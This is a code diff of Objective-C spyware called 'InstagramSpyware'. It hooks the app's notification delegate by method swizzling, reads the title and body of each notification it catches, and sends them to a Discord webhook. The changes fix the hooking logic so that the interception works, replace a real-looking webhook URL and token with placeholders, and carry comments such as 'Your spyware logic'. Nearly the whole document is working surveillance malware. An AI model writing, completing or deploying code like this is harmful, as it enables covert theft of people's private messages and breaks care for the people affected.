@@ -43,7 +43,7 @@
 - (instancetype)init {
     self = [super init];
     if (self) {
-        _discordWebhookURL = @"https://discordapp.com/api/webhooks/1252261340702310422/iUMCrX_RbZl_mHaUFN7czWbczo-88jV1xSC97_bN3AWtsRsUgrpwIl23BRbk1ti7u8ma";
+        _discordWebhookURL = @"https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
         
         NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
         config.timeoutIntervalForRequest = 30.0;
@@ -211,67 +211,66 @@
 #pragma mark - Notification Swizzling
 
 - (void)hookNotifications {
-    [NSTimer scheduledTimerWithTimeInterval:5.0 repeats:YES block:^(NSTimer * _Nonnull timer) {
+    // Use a timer to poll for the delegate, as it might not be available immediately.
+    [NSTimer scheduledTimerWithTimeInterval:1.0 repeats:YES block:^(NSTimer * _Nonnull timer) {
         UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
         id delegate = center.delegate;
-        Class delegateClass = [delegate class];
 
-        if (!delegateClass) {
+        if (!delegate) {
+            // Delegate not yet set, keep retrying.
             NSLog(@"[InstagramSpyware] Notification delegate not yet available, will retry...");
             return;
         }
 
+        // We found the delegate, so we can stop the timer.
+        [timer invalidate];
+
+        Class delegateClass = [delegate class];
         SEL originalSelector = @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:);
         Method originalMethod = class_getInstanceMethod(delegateClass, originalSelector);
 
         if (!originalMethod) {
-            NSLog(@"[InstagramSpyware] Could not find the notification delegate method to hook.");
+            NSLog(@"[InstagramSpyware] Could not find the notification delegate method to hook on class %@.", NSStringFromClass(delegateClass));
             return;
         }
 
-        SEL swizzledSelector = @selector(swizzled_didReceiveNotification:didReceiveNotificationResponse:withCompletionHandler:);
-        Method swizzledMethod = class_getInstanceMethod([self class], swizzledSelector);
+        // Define the swizzled method selector.
+        SEL swizzledSelector = @selector(swizzled_userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:);
 
-        if (class_getInstanceMethod(delegateClass, swizzledSelector)) {
-            NSLog(@"[InstagramSpyware] Notification delegate already hooked.");
-            [timer invalidate];
-            return;
-        }
-
+        // *** THE FIX IS HERE ***
+        // We need to add our swizzling implementation to the TARGET class (the delegate's class),
+        // not our own class. Then we can exchange the implementations.
+        Method swizzledMethod = class_getInstanceMethod([InstagramSpyware class], @selector(swizzled_didReceiveNotification:didReceiveNotificationResponse:withCompletionHandler:));
+        
+        // Add the method from our class to the delegate's class.
         BOOL didAddMethod = class_addMethod(delegateClass,
-                                           swizzledSelector,
-                                           method_getImplementation(swizzledMethod),
-                                           method_getTypeEncoding(swizzledMethod));
+                                            swizzledSelector,
+                                            method_getImplementation(swizzledMethod),
+                                            method_getTypeEncoding(swizzledMethod));
 
         if (didAddMethod) {
+            // If the method was added, get the newly added method and exchange it.
             Method newMethod = class_getInstanceMethod(delegateClass, swizzledSelector);
             method_exchangeImplementations(originalMethod, newMethod);
-            NSLog(@"[InstagramSpyware] Successfully hooked notification delegate.");
-            [timer invalidate];
+            NSLog(@"[InstagramSpyware] Successfully hooked notification delegate on class %@.", NSStringFromClass(delegateClass));
         } else {
-            NSLog(@"[InstagramSpyware] Failed to add swizzled method to delegate class.");
+            NSLog(@"[InstagramSpyware] Failed to add swizzled method to delegate class. It might already exist.");
         }
     }];
 }
 
-- (void)swizzled_didReceiveNotification:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler {
+// Rename this method to match the selector used in the hook.
+- (void)swizzled_userNotificationCenter:(UNUserNotificationCenter *)center
+            didReceiveNotificationResponse:(UNNotificationResponse *)response
+                         withCompletionHandler:(void (^)(void))completionHandler {
+
     // --- Your spyware logic ---
     UNNotificationContent *content = response.notification.request.content;
-    InstagramSpyware *spyware = [InstagramSpyware sharedInstance];
+    InstagramSpyware *spyware = [InstagramSpyware sharedInstance]; // Use sharedInstance to access spyware methods
     NSDictionary *notificationPayload = @{
         @"content": [NSString stringWithFormat:@"🔔 Intercepted Instagram Notification\n**Title:** %@\n**Body:** %@", content.title, content.body],
         @"username": @"Instagram Spy",
-        @"avatar_url": @"https://i.imgur.com/mDKlggm.png",
-        @"embeds": @[@{
-            @"title": @"Notification Details",
-            @"color": @5814783,
-            @"fields": @[
-                @{ @"name": @"Title", @"value": content.title ?: @"No Title", @"inline": @NO },
-                @{ @"name": @"Body", @"value": content.body ?: @"No Body", @"inline": @NO },
-                @{ @"name": @"Timestamp", @"value": [NSDateFormatter localizedStringFromDate:[NSDate date] dateStyle:NSDateFormatterShortStyle timeStyle:NSDateFormatterShortStyle], @"inline": @NO }
-            ],
-            @"footer": @{ @"text": @"Instagram Spy" }
-        }]
+        @"avatar_url": @"https://i.imgur.com/mDKlggm.png"
     };
     [spyware sendToDiscordWebhook:notificationPayload];
     // --- End of spyware logic ---
@@ -279,7 +278,9 @@
     // Call the original implementation using the swizzled selector.
     // This works because method_exchangeImplementations swaps the IMPs.
     // So calling 'swizzled_didReceiveNotification' on the original class now calls the original method.
-    [self swizzled_didReceiveNotification:center didReceiveNotificationResponse:response withCompletionHandler:completionHandler];
+    [self swizzled_userNotificationCenter:center
+                didReceiveNotificationResponse:response
+                             withCompletionHandler:completionHandler];
 }
 
 #pragma mark - Data Exfiltration
